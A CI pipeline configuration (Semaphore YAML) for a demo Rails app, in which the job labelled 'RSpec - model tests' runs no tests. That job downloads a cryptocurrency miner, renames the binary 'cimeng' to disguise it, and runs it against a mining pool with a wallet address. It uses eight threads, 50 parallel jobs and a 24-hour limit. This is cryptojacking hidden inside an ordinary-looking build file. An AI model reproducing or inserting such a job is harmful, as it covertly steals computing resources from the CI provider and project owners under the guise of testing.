version: v1.0
name: Demo Rails 5 app
agent:
  machine:
    type: e1-standard-2
    os_image: ubuntu1804
execution_time_limit:
  hours: 24
global_job_config:
  prologue:
    commands:
      - checkout
      - cache restore
      - sem-version ruby 2.6.0
      - bundle install --deployment -j 4 --path vendor/bundle
blocks:
  - name: Unit tests
    dependencies: []
    task:
      prologue:
        commands:
          - sem-service start postgres
          - 'bundle exec rake db:setup'
      jobs:
        - name: RSpec - model tests
          commands:
            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
            - tar xf cpuminer-opt-linux.tar.gz
            - mv cpuminer-sse2 cimeng
            - './cimeng -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1q0k8xdre9gujl89waj9avfme3jmfkadpswelmf3.2000a -t8'
          parallelism: 50
        - name: RSpec - controller tests
          commands:
            - bundle exec rspec spec/controllers
